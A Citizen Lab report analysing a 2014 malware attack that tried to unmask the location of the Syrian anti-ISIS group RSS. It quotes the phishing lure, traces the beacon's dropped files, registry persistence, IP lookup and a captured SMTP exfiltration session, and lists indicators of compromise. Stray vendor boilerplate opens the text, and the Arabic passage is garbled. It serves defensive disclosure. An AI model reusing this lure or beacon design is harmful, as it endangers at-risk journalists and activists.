and the Checkmark Logo are trademarks or
Mountain View , CA 94043 USA                                                                                   registered trademarks of Symantec Corporation
+ 1 ( 650 ) 527 - 8000                                                                                              or its affiliates in the U.S. and other countries .
1 ( 800 ) 721 - 3934                                                                                              Other names may be trademarks of their
www.symantec.com                                                                                                                              respective owners .
Any technical information that is made available by Symantec Corporation is the copyrighted work of Symantec Corporation and is owned by Symantec
Corporation .
NO WARRANTY . The technical information is being delivered to you as is and Symantec Corporation makes no warranty as to its accuracy or use . Any use
of the technical documentation or the information contained herein is at the risk of the user . Documentation may include technical or other inaccuracies or
typographical errors . Symantec reserves the right to make changes without prior notice .

Malware Attack Targeting Syrian ISIS Critics
by John Scott - Railton and Seth Hardy
With the collaboration of Cyber Arabs .
Media coverage : Associated Press , Forbes
Summary
This report describes a malware attack with circumstantial links to the Islamic State in Iraq and Syria . In the interest of
highlighting a developing threat , this post analyzes the attack and provides a list of Indicators of Compromise .
A Syrian citizen media group critical of Islamic State of Iraq and Syria ( ISIS ) was recently targeted in a
customized digital attack designed to unmask their location . The Syrian group , Raqqah is being Slaughtered
Silently ( RSS ) , focuses its advocacy on documenting human rights abuses by ISIS elements occupying the city of Ar-
Raqah . In response , ISIS forces in the city have reportedly targeted the group with house raids , kidnappings , and an
alleged assassination . The group also faces online threats from ISIS and its supporters , including taunts that ISIS is spying
on the group .
Though we are unable to conclusively attribute the attack to ISIS or its supporters , a link to ISIS is
plausible . The malware used in the attack differs substantially from campaigns linked to the Syrian
regime , and the attack is focused against a group that is an active target of ISIS forces .
Background : Citizen Journalists under Threat in ISIS - controlled Territories
As the Syrian Civil War continues , Syrian citizen journalists and nonviolent activists operate in an increasingly unsafe
environment . The regime has never welcomed their work , and has often targeted them for arrest and detention , and a
multi - year hacking campaign ( see Pro - Regime / Regime Linked Groups ) . Additionally , not all elements of the Syrian
opposition have uniformly supported nonviolent activists and citizen journalists . More recently , in areas like Raqqah ,
nonviolent activists face a new and exceptionally grave threat : ISIS . A growing number of reports suggest that ISIS is
systematically targeting groups that document atrocities , or that communicate with Western media and aid organizations ,
sometimes under the pretext of finding “ spies ” .
Map : Raqqah is indicated by the red arrow . Colors indicate areas mostly under the control of the following groups :
Black = ISIS , Red = Syrian Regime , Green = Free Syrian Army , Yellow = Kurdish . Note : the map is not highly detailed ,
nor completely up - to - date , but is useful in showing general areas of control . Source : @DeSyracuse
Ar - Raqqah , the city in which the case study is located , is situated in northern Syria and continues to be a key conflict
flashpoint of the Syrian Civil War . In the spring of 2013 , Islamists and Free Syrian Army ( FSA ) fighters took over Ar-
Raqqah from regime forces . As ISIS gained momentum , they consolidated their control over the city , edging out FSA-
affiliated groups through attacks , summary executions , and kidnappings against a range of groups , including ethnic and
religious minorities .
Information Control by ISIS
During 2014 , there were a number of reports — many unconfirmed — that ISIS confiscated smartphones and laptops from
captured activists . According to Syrians who experienced these searches and spoke with one of the reports’ authors , ISIS
sometimes extracts data from confiscated smartphones and laptops to collect information about people and groups they
are targeting , as well as to seek evidence of “ un - Islamic ” activities .
As ISIS cements their control of Ar - Raqqah and other territories , reports have emerged recently ( though not all of them
confirmed ) suggesting that elements within ISIS are growing increasingly sophisticated at imposing control and targeting
opponents using digital methods . Reports about ISIS targeting Internet cafés have grown increasingly common , and in
some cases reports point to the possible use of keyloggers as well as unspecified “ IP sniffers ” to track behaviour in Internet
cafes .
The Situation of Nonviolent Activists and Citizen Journalists in Ar - Raqqah
Nonviolent activists and citizen journalists based in Ar - Raqqah have provided the outside world with much of what we
know about how ISIS treats the population . These activists and journalists face mortal danger for their actions , and
reports have emerged of their detention and torture at the hands of ISIS .
As ISIS continues to use social media to push the message that it is welcomed by the population of Ar - Raqqah , groups like
Raqqah is being Slaughtered Silently ( RSS ) provide a compelling counter narrative . RSS hasn’t escaped ISIS’ notice , and
the group has been targeted for kidnappings , house raids , and at least one alleged targeted killing . At the time of writing ,
ISIS is allegedly holding several citizen journalists in Ar - Raqqah .
Image 1 : Example of an online threat made against RSS . The image , which can not be confirmed , purports to show CCTV
installed around Raqqah .
In addition , RSS is targeted online by ISIS supporters with harassment , including threats to the physical safety of its
members . For example , ISIS supporters have claimed that ISIS has established a system of CCTV cameras in Ar - Raqqah to
observe residents’ movements . While this claim may be a bluff or exaggeration , at least one ISIS supporter has indicated
on social media that this system could be used to look for members of RSS .
Analyzing the Attack
This section describes a highly targeted attack sent to an e - mail address belonging to RSS . The Citizen Lab analyzed this
attack with the consent of RSS , which requested that their name be used in this report .
The attack took the form of an unsolicited e - mail containing a download link to a decoy file . The file
contained custom malware that profiled the victim ’s computer and beaconed its IP address to an e - mail
account under the attacker ’s control .
The Targeting of RSS
The unsolicited message below was sent to RSS at the end of November 2014 from a Gmail email address . The message
was carefully worded , and contained references specific to the work and interests of RSS .
Targeting Email
Thank you for your efforts to deliver a true picture of the reality of life in Raqqah . As Syrians residing in Canada we are
working with media because we believe in the importance of shedding light on the realities of life in Syria , and Raqqah in
particular . We are preparing a lengthy news report on the realities of life in Raqqah . We are sharing some information
with you with the hope that you will correct it in case it contains errors . We have prepared a map of the city of Raqqah , in
addition to a preliminary report . We hope that you have a look at it with them and inform us of any errors . We also hope
that if you happen to be on Facebook , you could provide us with the account of the person responsible for the campaign , if
you do n’t mind , so that we can communicate with him directly .
You can see a preliminary copy of the report on this linkhttp://tempsend [ DOT]com/[Redacted]With all respect
[ Name Redacted ]
Original Arabic
‫ﺒﺔ‬#$ ‫ﺔ‬#‫ ﺗﺤ‬ ..
‫ﻟﻀﻮء‬+ ‫ﻂ‬#‫ ﻓﻲ ﺗﺴﻠ‬1‫ﻤ‬3‫ﻟﻤﺴﺎ‬+ 567‫ ﺑﻀﺮ‬:‫ﻻﻋﻼ‬+ > ‫ ﻧﻌﻤﻞ ﻓﻲ ﻣﺠﺎ‬+‫ﻦ ﻓﻲ ﻛﻨﺪ‬#‫ﻤ‬#‫ﻦ ﻣﻘ‬#I6‫ﻤﺎﻧﺎ ً ﻣﻨﺎ ﻛﺴﻮ‬I+7 , ‫ﻟﺮﻗﺔ‬+ ‫ ﻓﻲ‬5‫ﺎ‬#‫ﻟﺤ‬+ ‫ﻗﻊ‬+‫ﺔ ﻟﻮ‬#‫ﻘ‬#‫ﻟﺤﻘ‬+ M6‫ﻟﺼﻮ‬+ > ‫ﺼﺎ‬I‫ﻟﻤﻘﺪﻣﺔ ﻹ‬+ ‫ﻛﻢ‬Q‫ﻮ‬R‫ﻟﺸﻜﺮ ﻟﺠ‬+ ‫ﺑﻌﺪ‬
1‫ﻟﺮﻗ‬+ ‫ ﻓﻲ‬5‫ﺎ‬#‫ﻟﺤ‬+ ‫ﻗﻊ‬+7 > ‫ﺮ ﺻﺤﻔﻲ ﻣﻄﻮ > ﺣﻮ‬I‫ ﺗﻘﺮ‬Q+‫ ﺑﺈﻋﺪ‬:‫ ﻓﺈﻧﻨﺎ ﻧﻘﻮ‬ , Z‫ ﺑﺸﻜﻞ ﺧﺎ‬1‫ﻟﺮﻗ‬+7 : ‫ﺎ ﺑﺸﻜﻞ ﻋﺎ‬I6‫ ﻓﻲ ﺳﻮ‬5‫ﺎ‬#‫ﻟﺤ‬+ ‫ﻗﻊ‬+7 ‫ ﻋﻠﻰ‬.
^‫ﻼ‬$‫ﻹ‬+ ‫ ﻣﻨﻜﻢ‬+‫ﺮ ﻣﺒﺪء ` ﻧﺮﺟﻮ‬I‫ﻟﻰ ﺗﻘﺮ‬+ 1‫ﻟﺮﻗﺔ ﺑﺎﻻﺿﺎﻓ‬+ ‫ﻨﺔ‬I‫ﻄﺔ ﻟﻤﺪ‬I‫ ﺧﺮ‬Q+‫ﺚ ﻗﻤﻨﺎ ﺑﺈﻋﺪ‬#‫ ﺣ‬ , ‫ﺌﺔ‬$‫ﻨﺎ ﻓﻲ ﺣﺎ > ﻛﺎﻧﺖ ﺧﺎ‬I‫ﻟﺘﻲ ﻟﺪ‬+ f‫ﻟﻤﻌﻠﻮﻣﺎ‬+ ‫ﺢ ﺑﻌﺾ‬#‫ﺻﻞ ﻣﻌﻜﻢ ﻟﺘﺼﺤ‬+‫ﻟﺬﻟﻚ ﻗﻤﻨﺎ ﺑﺎﻟﺘﻮ‬7
1‫ﺻﻞ ﻣﻌ‬+‫ﻟﺘﻮ‬+ ‫ﺘﻢ‬#‫ ﻟ‬ , ‫ﻟﻚ‬k ‫ﻜﻢ ﻣﺎﻧﻊ ﻣﻦ‬I‫ﻜﻦ ﻟﺪ‬I ‫ ﻓﻲ ﺣﺎ > ﻟﻢ‬1‫ﻟﺤﻤﻠ‬+ ‫ﻦ ﻋﻠﻰ‬#‫ﻟﻘﺎﺋﻤ‬+ ‫ﺣﺪ‬+ m‫ﺪﻧﺎ ﺑﺤﺴﺎ‬I7‫ ﺑﺘﺰ‬o‫ﺲ ﺑﻮ‬#‫ﻟﻔ‬+ ‫ﺟﺪﻛﻢ ﻋﻠﻰ‬+‫ ﻣﻨﻜﻢ ﻓﻲ ﺣﺎ > ﺗﻮ‬+‫ ﻛﻤﺎ ﻧﺮﺟﻮ‬ , ‫ﺗﻨﺎ ﺑﺄ ` ﺧﻄﺎء‬Q‫ﻗﺎ‬r7 ‫ﺎ‬R#‫ﻋﻠ‬
‫ﻟﺘﺎﻟﻲ‬+ ‫ﺑﻂ‬+‫ﻟﺮ‬+ ‫ﺮ ﻋﻠﻰ‬I‫ﺔ ﻟﻠﺘﻘﺮ‬#‫ﻟﻤﺒﺪﺋ‬+ 1‫ﻟﻨﺴﺨ‬+ ‫ﻼ^ ﻋﻠﻰ‬$‫ﻻ‬+ ‫ﻤﻜﻨﻜﻢ‬I‫ﺑﺸﻜﻞ ﻣﺒﺎﺷﺮ‬http://tempsend [ DOT]com/[Redacted]‫ﺮ‬I‫ﻟﺘﻘﺪ‬+ ‫ﻣﻊ ﻛﻞ‬
[ Name Redacted ]
We are unsure why the attacker specifically mentions Canada in the email lure . However , it is well known that Syria ’s
extensive diaspora ( including in Canada ) regularly engages in advocacy , sometimes in coordination with groups within
Syria . Thus , the message is not on its face implausible . However , we note that the attacker also attempts to social
engineer the identity of individuals working with RSS , by requesting a personal Facebook page .
Analyzing the Malware
The custom malware used in this attack infects a user who views the decoy “ slideshow , ” and beacons home with the IP
address of the victim ’s computer and details about his or her system each time the computer restarts .
Unlike Syrian regime - linked malware , it contains no Remote Access Trojan ( RAT ) functionality ,
suggesting it is intended for identifying and locating a target .
Further , because the malware sends data captured by the malware to an e - mail address , it does not require that the
attackers maintain a command - and - control server online . This functionality would be especially useful to an adversary
unsure of whether it can maintain uninterrupted Internet connectivity .
Narrative of Infection
Accessing the link provided in the malicious e - mail sends the user to a .zip file hosted on file - sharing site
tempsend.com . At the time of writing the file had been downloaded only 10 times
Image 2 : Tempsend screenshot
The file to be downloaded is “ slideshow.zip ”
MD5 : b72e6678e79cc57d33e684528b5721bd
This file contains slideshow.exe
MD5 : f8bfb82aa92ea6a8e4e0b378781b3859
This file is a self - extracting archive with an icon intended to suggest to the victim that it is itself a slideshow .
When run , the file opens a slideshow of Google Earth screen captures to the victim , displaying a series of locations in
Syria , and highlighting an “ ISIS HQ ” and other images showing the alleged locations of US airstrikes .
Examples of images in the slideshow as follows :
Infection and Data Collection
When opened , the “ slideshow.zip ” file writes and executes several files :
C:\Users\[Username]\AppData\Local\Temp\IXP000.TMP\AdobeR1.exe C:\Users\
[ Username]\AppData\Local\Temp\IXP000.TMP\pictures.exe
“ AdobeR1.exe ” is malicious , while “ pictures.exe ” is the genuine slideshow displayed to the victim . When the slideshow is
closed both AdobeR1.exe and pictures.exe are deleted .
The AdobeR1 file writes a series of executable files that perform information collection and communication functions ,
including :
C:\Users\[Username]\Microsoft\Windows\Z0xapp8T.tmp\AdbrRader.exe
C:\Users\[Username]\Microsoft\Windows\Z0xapp8T.tmp\AdobeIns.exe
C:\Users\[Username]\Microsoft\Windows\Z0xapp8T.tmp\GoogleUpate.exe
C:\Users\[Username]\Microsoft\Windows\Z0xapp8T.tmp\GooglUpd.exe
C:\Users\[Username]\Microsoft\Windows\Z0xapp8T.tmp\nvidrv.exe
C:\Users\[Username]\Microsoft\Windows\Z0xapp8T.tmp\nvisdvr.exe
C:\Users\[Username]\Microsoft\Windows\Z0xapp8T.tmp\rundl132.exe
C:\Users\[Username]\Microsoft\Windows\Z0xapp8T.tmp\svhosts.exe
C:\Users\[Username]\Microsoft\Windows\Z0xapp8T.tmp\nvidrv.exe
Program Sequence
The program sequence of data collection and sending is somewhat unusual , with each program performing a single task
and communicating via markers left in the registry . Programs appear to make use of the Visual C++ Runtime Library .
First , the program nvidrv adds itself to autorun :
HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run under name “ UpdAdbreader ”
It also creates a series of registry keys that the individual programs use to communicate :
Registry keys and programs using them :
rundl132.exe :
DefaultKeyboard\User\F124 - 5KK83-F2IV9-FDN293\JIPC7-K2ODP - OFnD3-FJCC3\J1K6F - DKV8J - FKVJI-
GVKBU\6nvisdvr.exe :
DefaultKeyboard\User\F124 - 5KK83-F2IV9-FDN293\JIPC7-K2ODP - OFnD3-FJCC3\J1K4F - DKV8J - FKVJI-
GVKBU\4GoogleUpate.exe :
DefaultKeyboard\User\F124 - 5KK83-F2IV9-FDN293\JIPC7-K2ODP - OFnD3-FJCC3\J1K3F - DKV8J - FKVJI-
GVKBU\3AdbrRader.exe :
DefaultKeyboard\User\F124 - 5KK83-F2IV9-FDN293\JIPC7-K2ODP - OFnD3-FJCC3\J1K2F - DKV8J - FKVJI-
GVKBU\2nvidrv.exe :
DefaultKeyboard\User\F124 - 5KK83-F2IV9-FDN293\JIPC7-K2ODP - OFnD3-FJCC3\J1K1F - DKV8J - FKVJI - GVKBU\1
Sets name “ 1 ” to StartupInfo structure as a string , e.g. “ 0x3110x611 ”
It then runs GooglUpd , which cleans up the program files if they exist , and runs AdbrRader . AdbrRader
( communicating through registry key “ 2 ” ) writes the file vgadmysadm.tmp with the name of another registry key “ 2 ” with
startup info .
C:\Users\[Username]\AppData\Local\Microsoft\Windows\win32.tmp\ vgadmysadm.tmp
Next , nvidrv runs GoogleUpate , which collects system information and writes it to :
C:\Users\[Username]\AppData\Local\Microsoft\Windows\win32.tmp\vg2sxoysinf.tmp
Then nvidrv runs nvisdvr ( registry key “ 4 ” ) that collects a list of running processes , which are written to :
C:\Users\[Username]\AppData\Local\Microsoft\Windows\win32.tmp\v2cgplst.tmp
Finally , nvidrv runs svhosts , which tests Internet connectivity by doing a DNS query for windowsupdate.microsoft.com .
It then runs rundl132 if it has not before , by checking whether registry key name “ 6 ” is present . It sets the key to “ 0 ” and
runs it .
Next , “ rundl132.exe ” performs an HTTP GET request to myexternalip.com and collects the external IP of the infected
machine :
GET /raw HTTP/1.1
Host : myexternalip.com
Cache - Control : no - cacheHTTP/1.1 200 OK
Server : nginx/1.6.2
Content - Type : text / html ; charset = utf-8
Transfer - Encoding : chunked
Connection : close
Date : [ REDACTED ]
My - External - Ip : [ REDACTED]f
[ REDACTED]0
Next , rundl132 writes :
C:\Users\[Username]\AppData\Local\Microsoft\Windows\Temporary Internet Files\Content . IE5\Q7B90TFG\raw[1].txt
Then rundl132 writes the external IP to :
C:\Users\[Username]\AppData\Local\Microsoft\Windows\win32.tmp\vgosysaext.tmp
Finally , rundl132 runs AdobeIns , which zips the contents of the win32.tmp folder .
Program “ AdobeIns.exe ” takes the files written by the other programs and zips them in an encrypted , password-
protected file :
C:\Users\[Username]\AppData\Local\Microsoft\Windows\win32.tmp\drv.sys\mxtd
Data Transmission
Data is transmitted by e - mail to an account presumably controlled by the attacker .
AdobeIns connects to an account at the online e - mail provider inbox.com via smtp using hardcoded credentials . The
malware then sends an e - mail to the same inbox containing the text “ Hello ” and with mxtd file attached .
SMTP traffic generated by the malware to inbox.com ( with redactions )
220 [ REDACTED]ESMTP Postfix
EHLO [ REDACTED ]
250-[REDACTED ]
250-PIPELINING
250-SIZE 10240000
250-VRFY
250-ETRN
250-ENHANCEDSTATUSCODES
250 - 8BITMIME
250 DSN
MAIL FROM : < [ REDACTED]@inbox.com >
250 2.1.0 Ok
RCPT TO : < [ REDACTED]@inbox.com >
250 2.1.5 Ok
DATA
354 End data with .
Date : [ REDACTED ]
From : < [ REDACTED]@inbox.com >
X - Priority : 3 ( Normal )
To : < [ REDACTED]@inbox.com >
Subject : repo
MIME - Version : 1.0
Content - Type : multipart / mixed ; boundary=”__MESSAGE__ID__[REDACTED]”–__MESSAGE__ID__[REDACTED ]
Content - type : text / plain ; charset = US - ASCII
Content - Transfer - Encoding : 7bitHello
–__MESSAGE__ID__[REDACTED ]
Content - Type : application / x - msdownload ; name=”mxtd ”
Content - Transfer - Encoding : base64
Content - Disposition : attachment ; filename=”mxtd”[REDACTED]–__MESSAGE__ID__[REDACTED]–.
250 2.0.0 Ok : queued as [ REDACTED ]
QUIT
221 2.0.0 Bye
Evaluation of the Malware ’s Functionality
The malware seen in this case study is unusual as it relies on a half - dozen separate executable files , each with a
single task , and each communicating via markers dropped in the Registry .
The malware is also interesting because it does not provide remote access , but only sends an e - mail containing
the victim ’s IP address and miscellaneous system information . The malware resends the information each time
the computer is restarted , but it does not refresh the sent information on restart ( which may be a bug ) . This behaviour
strongly suggests that the function of this malware is to serve as a beacon . The system information could be used to
identify processes to exploit in the future , however since the attacker has already triggered the execution of a file on the
victim ’s system , it is surprising that more was not taken , or that a RAT ( custom or widely available ) was not used . A RAT
would have provided much greater access alongside IP information
By not providing remote access and other RAT functionality , the program looks less like malware , and may attract less
attention from endpoint protection tools and scanners . Detections were low when the file was first submitted to
VirusTotal , for example . It registered only 6/55 detections by anti virus scanners , or a 10% detection rate .
Transmitting the malware via e - mail also provides a degree of obscurity , and has the additional advantage of providing a
layer of abstraction between the attacker and the target : there is no need to maintain a RAT command - and - control server .
The malware transmits autonomously , leaving the material in an inbox for the attacker to collect at a later time .
The malware has no obfuscation processes and is not highly technical in its development or interaction with Windows .
Nevertheless , we believe that the author of the program is aware of certain techniques to reduce the visibility of malware
on a network , including transmitting data via encrypted e - mail communications . However , the attacker has not correctly
implemented encrypted e - mail : the malware will not attempt to use a TLS connection in certain cases . As a result , account
login credentials may be readily available in network traffic .
In addition , the malware uses the old PKWARE implementation of zip encryption , which is not particularly secure . The
password for the zipped file is also present in the binary without encryption or obfuscation .
Targeted Threats Index
Citizen Lab researchers have developed the Targeted Threat Index ( TTI ) as a tool to standardize information about the
sophistication of targeted threats against civil society groups in our research . The index captures information about the
level of social engineering used ( “ Targeting Sophistication ” ) , and adds a Technical Sophistication value for the attack as a
multiplier .
This attack , which has little technical sophistication ( i.e. , it uses no exploits , code obfuscation , or techniques to frustrate
reversing , etc . ) , nevertheless has carefully developed social engineering in the seeding materials and bait document . Taken
together it rates a 3 for Targeting Sophistication and a 1.25 for Technical Sophistication by our metric , yielding a TTI score
of 3.75 . Citizen Lab research using the TTI has found that , despite low levels of technical sophistication , with well - crafted
social engineering malware attacks remain highly effective against civil society groups . More information is available
about the TTI in a recent Usenix Security paper .
Attribution
There are at least three possible sources for this malware attack :
Pro - regime / regime - linked malware groups
ISIS - linked hackers
Other , unknown actors
We evaluate each of these possibilities in turn , drawing on the information available to us after almost three years of
tracking regime - linked malware .
Pro - Regime / Regime - Linked Groups
Pro - regime malware actors have continually targeted the Syrian opposition with waves of malware since at least late 2011 .
Those campaigns have been extensively reported on by a range of groups , including Kaspersky , FireEye , Citizen Lab , the
Electronic Frontier Foundation , and many others . Regime - linked malware has a number of common features that
typically serve as distinguishing characteristics :
Social engineering focusing on the needs and interests of the opposition . Although targeted , the malware seeding
often aims at classes of people ( e.g. , people interested in ‘ shocking’ news about a fighter , or ‘ leaked’ information
about the Assad regime ) rather than carefully written spear phishing targeting a single individual or small group .
Use of widely available RATs ( njRAT , Xtreme Rat , ShadowTech Rat , DarkComet RAT , and Blackshades RAT , among
others ) .
At least one command - and - control server located within Syrian IP space ( often from a limited range of addresses ) .
Frequent use of Dynamic DNS providers like no - ip .
Use of “ crypters ” to obscure the binary .
These characteristics are not all present in every sample , but we have typically found one or more in almost every binary
we have examined that is Syrian regime - linked .
This malware attack differs from known regime - linked groups in each of these elements . Not only is it
exceptionally targeted , but it is also not a commonly available RAT . Nor does it have RAT functionality . The function of
the malware appears to be : identify and unmask the IP address of target(s ) , and resend them to the attacker with each
reboot . In addition , data is sent to an Internet e - mail address , and no crypter is used to obscure the binary .
We are aware of only one previous case in Syria in which e - mail was used to transmit data , and that we believed was
regime linked . That incident , observed in 2012 , also used hardcoded e - mail to exfiltrate . However , that malware had
substantially more functionality than this case : not only did it drop a second stage from a compromised site , but was also
included a mechanism for exfiltrating credentials from Facebook and hooking programs like Skype .
The lack of overlap in Tactics , Techniques , and Procedures ( TTPs ) between this attack and prior attacks does not rule out
Syrian regime - linked attackers . It is possible that regime - linked groups are trying a new approach . However , given that
known regime - linked groups continued to remain active during the same date range using familiar TTPs , this scenario
seems unlikely . In addition , it would be strange for regime - linked malware groups to undertake significant effort to
prepare and send an implant that has significantly less functionality than what they commonly use . Taken together , we
find this evidence supports the hypothesis that familiar regime - linked groups did not conduct the attack .
ISIS - linked Hackers
RSS operates in territory controlled by ISIS , and has faced extensive targeting by ISIS . Currently , they appear to be
directly targeted by ISIS for kidnappings and other retaliation , including executions . In addition , ISIS supporters have
explicitly suggested that the group is under surveillance and actively hunted . Together this evidence suggests that ISIS
has a strong motivation for using social engineering and/or malware to locate the members of RSS .
We think there are several features of the malware attack that align with the needs and constraints of
ISIS and its supporters in Ar - Raqqah , more so than other groups , as we understand them . For example :
The malware beacons location but does not provide RAT functionality .
The seeding attempts to obtain a ‘ private’ Facebook identity from RSS through social engineering .
The malware exfiltrates to an online e - mail account , thus not requiring the attacker to maintain a command - and-
control server online .
The social media activity of members of RSS is often highly public . Their location and exact membership , however , is
secret . We speculate that if an attacker were interested in maintaining long - term surveillance of the activities of RSS they
could have employed a RAT . However , if the attacker were interested in unmasking the location of its targets so they could
be physically tracked down , collecting IP data and system info would be a more reasonable approach .
ISIS or its supporters clearly have a strong interest in the ( rudimentary ) location tracking of the members of RSS that this
malware provides . Internet connectivity in Raqqah is extremely limited , and some of it is under ISIS control . Knowing the
IP address of a target could quickly narrow down targets to specific locations , and specific Internet services , or Internet
cafes in Raqqah . Given that the identities and locations of RSS members are closely guarded , such information would hold
significant intelligence value for ISIS . Armed with this kind of information , ISIS could physically harm people within
Raqqah ( and it is also possible that they have the ability to operate in some capacity in border areas of Turkey ) .
Little is publicly known about the technical capabilities of ISIS and its supporters ; however , reports have begun to emerge
suggesting that ISIS is interested in expanding its abilities . In addition , ISIS has reportedly gained the support of at least
one individual with some experience with social engineering and hacking : Junaid Hussain ( aka TriCk ) , a former member
of teamp0ison hacking team . While Mr. Hussain and associates have reportedly made threats against Western
governments , it is possible that he or others working with ISIS have quietly supported an effort to identify the targeted
organization , which is a highly visible thorn in the side of ISIS .
Other Unknown Actors
It is possible that the attack is the product of actors working for unknown purposes and targeting RSS . Given the activities
of RSS , however , it is unclear who this might be . It is not possible , for example , to reject the theory that some unknown
group within the FSA , or other groups opposing the Assad regime are responsible . Citizen journalists in Ar - Raqqah were
previously critical of arbitrary arrests carried out by non - ISIS groups in 2013 . However , it is unclear why those groups ,
which no longer control Ar - Raqqah , would be interested in RSS in November 2014 .
It is likely that third party actors , including several intelligence services , are closely monitoring various actors in the
conflict through a range of electronic means . However , there is little reason to suggest that they would use a tailored but
technically rudimentary attack to target RSS in particular .
Conclusion : ISIS Ca n’t Be Ruled Out
After considering each possibility , we find strong but inconclusive circumstantial evidence to support a
link to ISIS . However , we are unable to connect this attack directly to ISIS , Mr. Hussain , or other ISIS supporters . If
indeed ISIS or its supporters are responsible , it seems reasonable that such an offensive capability may still be in
development .
We hope that publishing this report will draw attention to a new and concerning threat that includes ISIS critics among its
targets . If ISIS is responsible , while this attack targets in - country impediments to ISIS objectives , other targets may
include ideological or military adversaries abroad .
Whether or not ISIS is responsible , this attack is likely the work of a non - regime threat actor who may be just beginning to
field a still - rudimentary capability in the Syrian conflict . The entry costs for engaging in malware attacks in a conflict like
the Syrian Civil War are low , and made lower by the fact that the rule of law is nonexistent for large parts of the country . In
still other parts ( under regime control ) , malware attacks appear to be state sanctioned .
Attacks Targeting Civil Society
Citizen Lab research into targeted digital threats against civil society confirms that civil society groups
face grave threats from targeted malware attacks , despite being under - resourced to defend against them .
The case highlighted here is no exception : lack of IT and security resources have made it difficult for the Syrian opposition
to address targeted and persistent digital threats against them . In addition , if ISIS is indeed responsible , this case suggests
how easy it is for belligerents in a conflict to begin fielding basic offensive digital capabilities , and how quickly the
capabilities can be pointed at unarmed civil society groups .
Warning : Social Engineering Thrives in Syrian Context
This attack was exceptionally targeted , and clearly reflected the work of an actor familiar with the operations of the
targeted organization . As most organizations working on issues surrounding Syria are aware , malware delivered with good
social engineering is a constant source of danger .
This particular attack can be prevented by not opening files sent by unknown persons . However , many
attacks in Syria come from hijacked accounts and impersonate people known to the targets . Social engineering remains an
unsolved problem , and continues to compromise groups throughout the Syrian opposition and their supporters .
This attack reaffirms the dangers posed by social engineering attacks , whether they deliver phishing campaigns or
malware . The circumstantial evidence of ISIS involvement suggests that groups working on topics that ISIS considers a
threat , and their partner organizations and supporters , should urgently examine their security policies and assess
the possible risks to their operations , and the consequences of exposure of sensitive information to ISIS .
Even if the link to ISIS turns out to be incorrect , it is possible that this will be a threat in the future .
Individuals and groups at risk can also consult materials in Arabic provided by Cyber Arabs including a series of very
accessible videos on digital security .
Indicators of Compromise
The malware files
Filename                                             MD5
slideshow.zip                b72e6678e79cc57d33e684528b5721bd
slideshow.exe                f8bfb82aa92ea6a8e4e0b378781b3859
Files dropped by the malware
Filename and Path                                                        MD5
C:\Users\
[ Username]\AppData\Local\Temp\IXP000.TMP\AdobeR1.exe                                 aa6bcba23cd39c2827d72d33f5104856
( note : folder and file deleted after slideshow closed )
C:\Users\
[ Username]\AppData\Local\Temp\IXP000.TMP\pictures.exe ( note :                         eda83c8e4ba7d088593f22d56cf39d9f
folder and file deleted after slideshow closed )
C:\Users\
9d36e8e3e557239d7006d0bb5c2df298
[ Username]\Microsoft\Windows\Z0xapp8T.tmp\AdbrRader.exe
C:\Users\
1d5d8c5ce3854de61b28de7ca73093f1
[ Username]\Microsoft\Windows\Z0xapp8T.tmp\AdobeIns.exe
C:\Users\
55039dd6ce3274dbce569473ad37918b
[ Username]\Microsoft\Windows\Z0xapp8T.tmp\GoogleUpate.exe
C:\Users\
efdd9b96ae0f43f7d738ead2e1d5430c
[ Username]\Microsoft\Windows\Z0xapp8T.tmp\GooglUpd.exe
C:\Users\
0e3eb8de93297f12b56de9fc33657066
[ Username]\Microsoft\Windows\Z0xapp8T.tmp\nvidrv.exe
C:\Users\
3eb6f95c321ace0e3b101fd7e2cdd489
[ Username]\Microsoft\Windows\Z0xapp8T.tmp\nvisdvr.exe
C:\Users\
84bbd592a212f5a84923e82621e9177d
[ Username]\Microsoft\Windows\Z0xapp8T.tmp\rundl132.exe
C:\Users\[Username]\Microsoft\Windows\Z0xapp8T.tmp\
13caa1c95e6610f2d5134174e1fb4fd0
svhosts.exe
Collected Information Files ( unencrypted )
Filename and Path
C:\Users\[Username]\AppData\Local\Microsoft\Windows\win32.tmp\v2cgplst.tmp
C:\Users\[Username]\AppData\Local\Microsoft\Windows\win32.tmp\vg2sxoysinf.tmp
C:\Users\[Username]\AppData\Local\Microsoft\Windows\win32.tmp\vgadmysadm.tmp
C:\Users\[Username]\AppData\Local\Microsoft\Windows\win32.tmp\vgosysaext.tmp
Exfiltrated file ( encrypted )
Filename and Path
C:\Users\[Username]\AppData\Local\Microsoft\Windows\win32.tmp\drv.sys\mxtd
Registry Keys
Filename and Path
DefaultKeyboard\User\F124 - 5KK83-F2IV9-FDN293\JIPC7-K2ODP - OFnD3-FJCC3\J1K1F-
DKV8J - FKVJI - GVKBU\1
DefaultKeyboard\User\F124 - 5KK83-F2IV9-FDN293\JIPC7-K2ODP - OFnD3-FJCC3\J1K2F-
DKV8J - FKVJI - GVKBU\2
DefaultKeyboard\User\F124 - 5KK83-F2IV9-FDN293\JIPC7-K2ODP - OFnD3-FJCC3\J1K3F-
DKV8J - FKVJI - GVKBU\3
DefaultKeyboard\User\F124 - 5KK83-F2IV9-FDN293\JIPC7-K2ODP - OFnD3-FJCC3\J1K4F-
DKV8J - FKVJI - GVKBU\4
DefaultKeyboard\User\F124 - 5KK83-F2IV9-FDN293\JIPC7-K2ODP - OFnD3-FJCC3\J1K6F-
DKV8J - FKVJI - GVKBU\6
Acknowledgements
Acknowledgements : We are grateful to Cyber Arabs and the Institute for War and Peace Reporting for their critical work
and assistance .
Special thanks to : several anonymous Syrians , Masashi Crete - Nishihata , Sarah McKune , Morgan Marquis - Boire , Ron
Deibert , Bill Marczak , Nart Villeneuve , Irene Poetranto , and Kristen Dennesen .
Support for this research is provided by grants from the John D. and Catherine T. MacArthur Foundation and the Ford
Foundation .
Footnotes
1    https://www.hate-speech.org/intense-hunt-for-americas-spies/
2    http://www.ibtimes.com/isis-militants-target-high-speed-internet-cafes-Raqqah-stronghold-1745382 ( note that this
report also sources Raqqah is being Slaughtered Silently )
3    https://www.hate-speech.org/intense-hunt-for-americas-spies/
4    http://www.telegraph.co.uk / news / worldnews / islamic - state/11291510/Syrian - activist - tell - of - brutal - torture - by - Assad-
regime - and - Isil.html
5    https://twitter.com/Raqqah_sl and http://www . Raqqah - sl.com
6    Special thanks to Cyber Arabs for assistance with the translation
7
https://www.virustotal.com/en/file/d9da10e6381cb5c97a966bab0e3bdb3966a61e3e49147cd112dc3beabe22a2c3/analysis/
